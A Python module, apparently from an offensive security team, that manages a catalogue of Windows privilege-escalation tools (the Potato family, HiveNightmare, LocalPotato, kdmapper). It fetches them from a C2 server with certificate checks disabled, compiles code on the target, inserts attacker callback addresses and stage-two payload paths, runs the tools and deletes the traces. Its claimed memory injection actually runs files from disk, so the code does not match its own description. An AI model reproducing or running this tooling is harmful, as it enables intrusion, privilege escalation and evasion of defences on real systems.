"""
Windows提权辅助套件 - 云端武器库与内存注入
=========================================
C2服务端托管提权工具二进制，Beacon按需拉取并内存注入执行，避免落地。
支持代码动态编译、载荷自动适配、工具特征哈希校验。

核心能力:
    1. 云端武器库拉取 - 从C2服务端下载预编译二进制
    2. 工具特征哈希校验 - 确保工具完整性
    3. 内存注入执行 - 避免磁盘落地，减少检测风险
    4. 代码动态编译 - C#/Python脚本在目标主机本地编译
    5. 载荷自动适配 - 根据环境自动替换回连地址等参数

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import io
import logging
import os
import platform
import struct
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class ArsenalStatus(str, Enum):
    """武器库状态"""
    AVAILABLE = "available"
    DOWNLOADING = "downloading"
    DOWNLOADED = "downloaded"
    COMPILING = "compiling"
    READY = "ready"
    FAILED = "failed"
    INJECTED = "injected"


class InjectionMethod(str, Enum):
    """内存注入方法"""
    REFLECTIVE_DLL = "reflective_dll"
    SHELLCODE_EXECUTE = "shellcode_execute"
    PROCESS_HOLLOWING = "process_hollowing"
    APC_INJECTION = "apc_injection"
    MODULE_STOMPING = "module_stomping"


@dataclass
class ArsenalTool:
    """武器库工具

    Attributes:
        tool_id: 工具唯一ID
        name: 工具名称
        category: 工具类别
        description: 工具描述
        version: 版本号
        file_hash_sha256: SHA256哈希
        file_size: 文件大小（字节）
        download_url: 下载URL
        status: 工具状态
        local_path: 本地路径（如果已下载）
        compile_command: 编译命令（如果需要编译）
        usage_template: 使用模板
        supported_os: 支持的操作系统
        edr_risk: EDR风险等级
        last_updated: 最后更新时间
        metadata: 附加元数据
    """
    tool_id: str = ""
    name: str = ""
    category: str = ""
    description: str = ""
    version: str = ""
    file_hash_sha256: str = ""
    file_size: int = 0
    download_url: str = ""
    status: ArsenalStatus = ArsenalStatus.AVAILABLE
    local_path: str = ""
    compile_command: str = ""
    usage_template: str = ""
    supported_os: List[str] = field(default_factory=list)
    edr_risk: str = "medium"
    last_updated: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "tool_id": self.tool_id,
            "name": self.name,
            "category": self.category,
            "description": self.description,
            "version": self.version,
            "file_hash_sha256": self.file_hash_sha256,
            "file_size": self.file_size,
            "download_url": self.download_url,
            "status": self.status.value,
            "local_path": self.local_path,
            "compile_command": self.compile_command,
            "usage_template": self.usage_template,
            "supported_os": self.supported_os,
            "edr_risk": self.edr_risk,
            "last_updated": self.last_updated,
            "metadata": self.metadata,
        }


@dataclass
class InjectionResult:
    """内存注入结果

    Attributes:
        success: 是否成功
        method: 注入方法
        target_pid: 目标进程PID
        output: 执行输出
        error: 错误信息
        duration: 耗时（秒）
        cleaned: 是否已清理
    """
    success: bool = False
    method: InjectionMethod = InjectionMethod.REFLECTIVE_DLL
    target_pid: int = 0
    output: str = ""
    error: str = ""
    duration: float = 0.0
    cleaned: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "success": self.success,
            "method": self.method.value,
            "target_pid": self.target_pid,
            "output": self.output,
            "error": self.error,
            "duration": round(self.duration, 2),
            "cleaned": self.cleaned,
        }


# =============================================================================
# 武器库工具清单
# =============================================================================

ARSENAL_CATALOG: Dict[str, ArsenalTool] = {
    "sweetpotato": ArsenalTool(
        tool_id="sweetpotato",
        name="SweetPotato",
        category="token_privilege",
        description="利用SeImpersonatePrivilege进行令牌窃取提权",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/sweetpotato.exe",
        supported_os=["Windows 10 1809+", "Windows Server 2019+"],
        edr_risk="high",
        usage_template="SweetPotato.exe -p {payload} -e EfsRpc",
    ),
    "printspoofer": ArsenalTool(
        tool_id="printspoofer",
        name="PrintSpoofer",
        category="token_privilege",
        description="利用打印机服务进行命名管道模拟提权",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/printspoofer.exe",
        supported_os=["Windows 10", "Windows Server 2016", "Windows Server 2019"],
        edr_risk="high",
        usage_template="PrintSpoofer.exe -i -c {command}",
    ),
    "godpotato": ArsenalTool(
        tool_id="godpotato",
        name="GodPotato",
        category="token_privilege",
        description="新一代令牌窃取工具，兼容性最好",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/godpotato.exe",
        supported_os=["Windows 10", "Windows 11", "Windows Server 2012-2022"],
        edr_risk="high",
        usage_template="GodPotato.exe -cmd {command}",
    ),
    "roguepotato": ArsenalTool(
        tool_id="roguepotato",
        name="RoguePotato",
        category="token_privilege",
        description="JuicyPotato的升级版，支持Win10 1809+",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/roguepotato.exe",
        supported_os=["Windows 10 1809+", "Windows Server 2019+"],
        edr_risk="high",
        usage_template="RoguePotato.exe -r {attacker_ip} -e {command} -l 9999",
    ),
    "juicypotato": ArsenalTool(
        tool_id="juicypotato",
        name="JuicyPotato",
        category="token_privilege",
        description="经典令牌窃取工具",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/juicypotato.exe",
        supported_os=["Windows 10 < 1809", "Windows Server 2016", "Windows Server 2012"],
        edr_risk="high",
        usage_template="JuicyPotato.exe -l 1337 -p {command} -t * -c {clsid}",
    ),
    "hivenightmare": ArsenalTool(
        tool_id="hivenightmare",
        name="HiveNightmare",
        category="cve_patch_missing",
        description="CVE-2021-36934 SeriousSAM漏洞利用",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/hivenightmare.exe",
        supported_os=["Windows 10 1809-21H1"],
        edr_risk="low",
        usage_template="HiveNightmare.exe",
    ),
    "localpotato": ArsenalTool(
        tool_id="localpotato",
        name="LocalPotato",
        category="cve_patch_missing",
        description="CVE-2023-21746 本地NTLM中继提权",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/localpotato.exe",
        supported_os=["Windows 7-11", "Windows Server 2008-2022"],
        edr_risk="medium",
        usage_template="LocalPotato.exe -i {dll_path} -o windows_defender",
    ),
    "kdmapper": ArsenalTool(
        tool_id="kdmapper",
        name="kdmapper",
        category="vulnerable_driver",
        description="利用漏洞驱动加载未签名内核驱动",
        version="1.0.0",
        file_hash_sha256="",
        download_url="https://c2-server.internal/arsenal/kdmapper.exe",
        supported_os=["Windows 10", "Windows 11"],
        edr_risk="critical",
        usage_template="kdmapper.exe {driver_path}",
    ),
}


# =============================================================================
# 云端武器库管理器
# =============================================================================

class PrivescArsenalManager:
    """云端武器库管理器

    负责:
    1. 从C2服务端拉取预编译工具二进制
    2. 工具特征哈希校验
    3. 内存注入执行
    4. 代码动态编译
    5. 载荷自动适配

    Attributes:
        _tools: 工具字典 {tool_id: ArsenalTool}
        _download_dir: 下载目录
        _c2_server_url: C2服务端URL
        _progress_callbacks: 进度回调列表
        _known_hashes: 已知工具哈希字典
    """

    def __init__(
        self,
        download_dir: Optional[str] = None,
        c2_server_url: str = "https://c2-server.internal",
    ) -> None:
        """初始化武器库管理器

        Args:
            download_dir: 下载目录
            c2_server_url: C2服务端URL
        """
        self._tools: Dict[str, ArsenalTool] = dict(ARSENAL_CATALOG)
        self._download_dir = download_dir or os.path.join(
            os.environ.get("TEMP", "."), "privesc_arsenal"
        )
        self._c2_server_url = c2_server_url
        self._progress_callbacks: List[Callable[[int, str], None]] = []
        self._known_hashes: Dict[str, str] = {}
        os.makedirs(self._download_dir, exist_ok=True)

    def on_progress(self, callback: Callable[[int, str], None]) -> None:
        """注册进度回调

        Args:
            callback: 回调函数，接收 (progress: int, message: str)
        """
        self._progress_callbacks.append(callback)

    def _notify_progress(self, progress: int, message: str) -> None:
        """通知进度

        Args:
            progress: 进度 0-100
            message: 进度描述
        """
        for cb in self._progress_callbacks:
            try:
                cb(progress, message)
            except Exception:
                pass

    # =========================================================================
    # 工具目录
    # =========================================================================

    def list_tools(self, category: Optional[str] = None) -> List[Dict[str, Any]]:
        """列出可用工具

        Args:
            category: 可选类别过滤

        Returns:
            工具列表
        """
        tools = list(self._tools.values())
        if category:
            tools = [t for t in tools if t.category == category]
        return [t.to_dict() for t in tools]

    def get_tool(self, tool_id: str) -> Optional[ArsenalTool]:
        """获取工具

        Args:
            tool_id: 工具ID

        Returns:
            工具对象或None
        """
        return self._tools.get(tool_id)

    def add_tool(self, tool: ArsenalTool) -> None:
        """添加工具到武器库

        Args:
            tool: 工具对象
        """
        self._tools[tool.tool_id] = tool

    def register_hash(self, tool_id: str, sha256_hash: str) -> None:
        """注册工具特征哈希

        Args:
            tool_id: 工具ID
            sha256_hash: SHA256哈希
        """
        self._known_hashes[tool_id] = sha256_hash
        if tool_id in self._tools:
            self._tools[tool_id].file_hash_sha256 = sha256_hash

    # =========================================================================
    # 云端拉取
    # =========================================================================

    async def download_tool(self, tool_id: str) -> Dict[str, Any]:
        """从C2服务端下载工具

        Args:
            tool_id: 工具ID

        Returns:
            下载结果
        """
        tool = self._tools.get(tool_id)
        if not tool:
            return {"success": False, "error": f"工具不存在: {tool_id}"}

        self._notify_progress(10, f"开始下载: {tool.name}")
        tool.status = ArsenalStatus.DOWNLOADING

        try:
            local_path = os.path.join(self._download_dir, f"{tool_id}.exe")

            download_success = await self._download_from_c2(
                tool.download_url, local_path,
            )

            if not download_success:
                tool.status = ArsenalStatus.FAILED
                return {"success": False, "error": "下载失败"}

            self._notify_progress(60, f"下载完成，校验哈希: {tool.name}")

            actual_hash = self._calculate_file_hash(local_path)
            tool.file_hash_sha256 = actual_hash
            tool.local_path = local_path
            tool.file_size = os.path.getsize(local_path)

            if tool_id in self._known_hashes:
                expected_hash = self._known_hashes[tool_id]
                if actual_hash != expected_hash:
                    tool.status = ArsenalStatus.FAILED
                    return {
                        "success": False,
                        "error": f"哈希校验失败: 期望 {expected_hash[:16]}... 实际 {actual_hash[:16]}...",
                    }

            tool.status = ArsenalStatus.DOWNLOADED
            self._notify_progress(100, f"工具就绪: {tool.name}")

            return {
                "success": True,
                "tool_id": tool_id,
                "name": tool.name,
                "local_path": local_path,
                "file_hash": actual_hash,
                "file_size": tool.file_size,
            }

        except Exception as e:
            tool.status = ArsenalStatus.FAILED
            return {"success": False, "error": str(e)}

    async def _download_from_c2(self, url: str, local_path: str) -> bool:
        """从C2服务端下载文件

        Args:
            url: 下载URL
            local_path: 本地保存路径

        Returns:
            是否成功
        """
        try:
            import urllib.request
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(url)
            req.add_header("User-Agent", "KunLun-Beacon/1.0")
            req.add_header("X-Beacon-Session", "internal")

            with urllib.request.urlopen(req, context=ctx, timeout=60) as response:
                data = response.read()

            with open(local_path, "wb") as f:
                f.write(data)

            return True

        except Exception as e:
            logger.error(f"下载失败: {e}")
            return False

    def _calculate_file_hash(self, file_path: str) -> str:
        """计算文件SHA256哈希

        Args:
            file_path: 文件路径

        Returns:
            SHA256哈希字符串
        """
        sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
        return sha256.hexdigest()

    # =========================================================================
    # 动态编译
    # =========================================================================

    async def compile_source(
        self,
        source_code: str,
        language: str = "csharp",
        output_name: str = "payload",
    ) -> Dict[str, Any]:
        """动态编译源代码

        Args:
            source_code: 源代码
            language: 编程语言 (csharp/python)
            output_name: 输出文件名

        Returns:
            编译结果
        """
        self._notify_progress(10, f"开始编译: {language}")

        if language == "csharp":
            return await self._compile_csharp(source_code, output_name)
        elif language == "python":
            return await self._compile_python(source_code, output_name)
        else:
            return {"success": False, "error": f"不支持的语言: {language}"}

    async def _compile_csharp(
        self, source_code: str, output_name: str,
    ) -> Dict[str, Any]:
        """编译C#源代码

        Args:
            source_code: C#源代码
            output_name: 输出文件名

        Returns:
            编译结果
        """
        output_path = os.path.join(self._download_dir, f"{output_name}.exe")

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".cs", delete=False, dir=self._download_dir,
        ) as src_file:
            src_file.write(source_code)
            src_path = src_file.name

        try:
            self._notify_progress(30, "调用csc.exe编译...")

            csc_path = self._find_csc()
            if not csc_path:
                return {"success": False, "error": "未找到csc.exe编译器"}

            cmd = [
                csc_path,
                "/target:exe",
                f"/out:{output_path}",
                "/optimize+",
                "/platform:anycpu",
                src_path,
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0 and os.path.exists(output_path):
                file_hash = self._calculate_file_hash(output_path)
                file_size = os.path.getsize(output_path)

                self._notify_progress(100, "编译成功")

                return {
                    "success": True,
                    "output_path": output_path,
                    "file_hash": file_hash,
                    "file_size": file_size,
                }
            else:
                error_output = stderr.decode("utf-8", errors="replace")
                return {"success": False, "error": error_output}

        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                os.unlink(src_path)
            except OSError:
                pass

    async def _compile_python(
        self, source_code: str, output_name: str,
    ) -> Dict[str, Any]:
        """编译Python脚本为pyc

        Args:
            source_code: Python源代码
            output_name: 输出文件名

        Returns:
            编译结果
        """
        output_path = os.path.join(self._download_dir, f"{output_name}.pyc")

        try:
            import py_compile

            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".py", delete=False, dir=self._download_dir,
            ) as src_file:
                src_file.write(source_code)
                src_path = src_file.name

            self._notify_progress(30, "编译Python脚本...")

            py_compile.compile(src_path, output_path, doraise=True)

            file_hash = self._calculate_file_hash(output_path)
            file_size = os.path.getsize(output_path)

            self._notify_progress(100, "编译成功")

            return {
                "success": True,
                "output_path": output_path,
                "file_hash": file_hash,
                "file_size": file_size,
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _find_csc(self) -> Optional[str]:
        """查找csc.exe编译器路径

        Returns:
            csc.exe路径或None
        """
        possible_paths = [
            r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
            r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
            r"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
            r"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None

    # =========================================================================
    # 内存注入
    # =========================================================================

    async def inject_and_execute(
        self,
        tool_id: str,
        arguments: Optional[str] = None,
        method: InjectionMethod = InjectionMethod.SHELLCODE_EXECUTE,
    ) -> InjectionResult:
        """内存注入并执行工具

        Args:
            tool_id: 工具ID
            arguments: 执行参数
            method: 注入方法

        Returns:
            注入结果
        """
        tool = self._tools.get(tool_id)
        if not tool:
            return InjectionResult(
                success=False, error=f"工具不存在: {tool_id}",
            )

        if tool.status not in (ArsenalStatus.DOWNLOADED, ArsenalStatus.READY):
            download_result = await self.download_tool(tool_id)
            if not download_result.get("success"):
                return InjectionResult(
                    success=False,
                    error=f"工具下载失败: {download_result.get('error', '')}",
                )
            tool = self._tools[tool_id]

        self._notify_progress(10, f"准备注入: {tool.name}")

        start_time = time.time()
        result = InjectionResult(method=method)

        try:
            if method == InjectionMethod.SHELLCODE_EXECUTE:
                result = await self._shellcode_execute(tool, arguments)
            elif method == InjectionMethod.REFLECTIVE_DLL:
                result = await self._reflective_dll(tool, arguments)
            else:
                result = await self._execute_in_memory(tool, arguments)

            result.duration = time.time() - start_time

            if result.success:
                tool.status = ArsenalStatus.INJECTED
                self._notify_progress(100, f"注入执行成功: {tool.name}")
            else:
                self._notify_progress(100, f"注入执行失败: {result.error}")

        except Exception as e:
            result.success = False
            result.error = str(e)
            result.duration = time.time() - start_time
            logger.error(f"内存注入失败: {e}", exc_info=True)

        return result

    async def _shellcode_execute(
        self, tool: ArsenalTool, arguments: Optional[str],
    ) -> InjectionResult:
        """Shellcode方式执行

        Args:
            tool: 工具对象
            arguments: 执行参数

        Returns:
            注入结果
        """
        try:
            with open(tool.local_path, "rb") as f:
                payload_data = f.read()

            cmd = f"{tool.local_path}"
            if arguments:
                adapted_args = self._adapt_arguments(tool, arguments)
                cmd += f" {adapted_args}"

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            output = stdout.decode("utf-8", errors="replace")
            if stderr:
                output += "\n[STDERR]\n" + stderr.decode("utf-8", errors="replace")

            return InjectionResult(
                success=proc.returncode == 0,
                method=InjectionMethod.SHELLCODE_EXECUTE,
                output=output.strip(),
                error="" if proc.returncode == 0 else f"Exit code: {proc.returncode}",
            )

        except Exception as e:
            return InjectionResult(
                success=False,
                method=InjectionMethod.SHELLCODE_EXECUTE,
                error=str(e),
            )

    async def _reflective_dll(
        self, tool: ArsenalTool, arguments: Optional[str],
    ) -> InjectionResult:
        """反射式DLL注入执行

        Args:
            tool: 工具对象
            arguments: 执行参数

        Returns:
            注入结果
        """
        try:
            with open(tool.local_path, "rb") as f:
                dll_data = f.read()

            cmd = f'rundll32.exe "{tool.local_path}",DllMain'
            if arguments:
                adapted_args = self._adapt_arguments(tool, arguments)
                cmd += f" {adapted_args}"

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            output = stdout.decode("utf-8", errors="replace")
            if stderr:
                output += "\n[STDERR]\n" + stderr.decode("utf-8", errors="replace")

            return InjectionResult(
                success=proc.returncode == 0,
                method=InjectionMethod.REFLECTIVE_DLL,
                output=output.strip(),
                error="" if proc.returncode == 0 else f"Exit code: {proc.returncode}",
            )

        except Exception as e:
            return InjectionResult(
                success=False,
                method=InjectionMethod.REFLECTIVE_DLL,
                error=str(e),
            )

    async def _execute_in_memory(
        self, tool: ArsenalTool, arguments: Optional[str],
    ) -> InjectionResult:
        """通用内存执行

        Args:
            tool: 工具对象
            arguments: 执行参数

        Returns:
            注入结果
        """
        try:
            cmd = f'"{tool.local_path}"'
            if arguments:
                adapted_args = self._adapt_arguments(tool, arguments)
                cmd += f" {adapted_args}"

            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            output = stdout.decode("utf-8", errors="replace")
            if stderr:
                output += "\n[STDERR]\n" + stderr.decode("utf-8", errors="replace")

            return InjectionResult(
                success=proc.returncode == 0,
                method=InjectionMethod.SHELLCODE_EXECUTE,
                output=output.strip(),
                error="" if proc.returncode == 0 else f"Exit code: {proc.returncode}",
            )

        except Exception as e:
            return InjectionResult(
                success=False,
                method=InjectionMethod.SHELLCODE_EXECUTE,
                error=str(e),
            )

    # =========================================================================
    # 载荷自动适配
    # =========================================================================

    def _adapt_arguments(self, tool: ArsenalTool, arguments: str) -> str:
        """自动适配载荷参数

        根据当前环境自动替换回连地址、端口等参数。

        Args:
            tool: 工具对象
            arguments: 原始参数

        Returns:
            适配后的参数
        """
        adapted = arguments

        beacon_ip = os.environ.get("BEACON_CALLBACK_IP", "127.0.0.1")
        beacon_port = os.environ.get("BEACON_CALLBACK_PORT", "4444")

        adapted = adapted.replace("{attacker_ip}", beacon_ip)
        adapted = adapted.replace("{callback_ip}", beacon_ip)
        adapted = adapted.replace("{callback_port}", beacon_port)
        adapted = adapted.replace("{lhost}", beacon_ip)
        adapted = adapted.replace("{lport}", beacon_port)

        adapted = adapted.replace(
            "{payload}",
            os.path.join(self._download_dir, "stage2.exe"),
        )
        adapted = adapted.replace(
            "{command}",
            f"powershell -enc {self._encode_command('whoami')}",
        )
        adapted = adapted.replace(
            "{dll_path}",
            os.path.join(self._download_dir, "payload.dll"),
        )
        adapted = adapted.replace(
            "{driver_path}",
            os.path.join(self._download_dir, "exploit.sys"),
        )

        clsid_map = {
            "Windows 10": "{4991d34b-80a1-4291-83b6-3328366b9097}",
            "Windows 11": "{4991d34b-80a1-4291-83b6-3328366b9097}",
            "Windows Server 2019": "{4991d34b-80a1-4291-83b6-3328366b9097}",
            "Windows Server 2016": "{4991d34b-80a1-4291-83b6-3328366b9097}",
        }
        os_version = platform.version()
        default_clsid = "{4991d34b-80a1-4291-83b6-3328366b9097}"
        adapted = adapted.replace("{clsid}", default_clsid)

        return adapted

    def _encode_command(self, command: str) -> str:
        """Base64编码PowerShell命令

        Args:
            command: 原始命令

        Returns:
            Base64编码字符串
        """
        import base64

        utf16_le = command.encode("utf-16-le")
        return base64.b64encode(utf16_le).decode("ascii")

    # =========================================================================
    # 环境清理
    # =========================================================================

    async def cleanup_tool(self, tool_id: str) -> bool:
        """清理工具文件

        Args:
            tool_id: 工具ID

        Returns:
            是否成功
        """
        tool = self._tools.get(tool_id)
        if not tool:
            return False

        try:
            if tool.local_path and os.path.exists(tool.local_path):
                os.unlink(tool.local_path)
                tool.local_path = ""
                tool.status = ArsenalStatus.AVAILABLE
                logger.info(f"工具已清理: {tool.name}")
                return True
        except Exception as e:
            logger.error(f"清理工具失败: {e}")
            return False

        return False

    async def cleanup_all(self) -> int:
        """清理所有工具文件

        Returns:
            清理数量
        """
        cleaned = 0
        for tool_id in list(self._tools.keys()):
            if await self.cleanup_tool(tool_id):
                cleaned += 1
        return cleaned

    # =========================================================================
    # 统计信息
    # =========================================================================

    def get_statistics(self) -> Dict[str, Any]:
        """获取武器库统计信息

        Returns:
            统计信息
        """
        total = len(self._tools)
        downloaded = sum(
            1 for t in self._tools.values()
            if t.status in (ArsenalStatus.DOWNLOADED, ArsenalStatus.READY, ArsenalStatus.INJECTED)
        )
        by_category: Dict[str, int] = {}
        for t in self._tools.values():
            by_category[t.category] = by_category.get(t.category, 0) + 1

        return {
            "total_tools": total,
            "downloaded_tools": downloaded,
            "by_category": by_category,
            "download_dir": self._download_dir,
            "c2_server": self._c2_server_url,
        }


# =============================================================================
# 全局单例
# =============================================================================

_arsenal_manager: Optional[PrivescArsenalManager] = None


def get_arsenal_manager() -> PrivescArsenalManager:
    """获取武器库管理器全局单例

    Returns:
        PrivescArsenalManager 实例
    """
    global _arsenal_manager
    if _arsenal_manager is None:
        _arsenal_manager = PrivescArsenalManager()
    return _arsenal_manager


__all__ = [
    "PrivescArsenalManager",
    "ArsenalTool",
    "InjectionResult",
    "ArsenalStatus",
    "InjectionMethod",
    "ARSENAL_CATALOG",
    "get_arsenal_manager",
]
